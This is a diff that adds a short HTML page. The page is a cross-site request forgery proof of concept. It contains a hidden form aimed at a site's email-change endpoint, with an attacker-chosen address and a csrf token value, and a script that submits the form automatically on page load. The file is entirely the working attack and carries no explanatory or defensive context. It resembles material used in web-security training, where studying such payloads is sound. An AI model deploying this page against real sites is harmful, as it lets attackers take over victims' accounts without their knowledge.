@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
